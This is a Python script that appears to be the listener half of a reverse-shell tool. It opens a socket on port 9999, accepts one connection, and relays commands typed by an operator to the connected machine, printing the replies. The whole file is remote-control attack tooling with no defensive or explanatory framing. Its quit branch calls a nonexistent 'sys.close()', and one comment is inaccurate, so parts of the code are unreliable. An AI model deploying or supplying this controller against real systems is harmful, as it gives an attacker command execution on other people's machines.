import socket
import sys

def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error "+ str(msg))


def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port"+ str(port))

        s.bind((host,port))
        s.listen(5) #parameter represents the no of bad connection requests

    except socket.error as msg:
        print("Socket binding error" + str(msg) + '\n'+ "Retrying")
        bind_socket(   )


def socket_accept():
    conn,address = s.accept()
    print("Conection was excepted at IP "+ address[0]+ " Port = "+str(address[1]))
    send_command(conn)
    conn.close()

def send_command(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.close()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_responce = str(conn.recv(1024),"utf-8")
            print(client_responce, end = " ")

def main():
    create_socket()
    bind_socket()
    socket_accept()

if __name__ == "__main__":
    main()  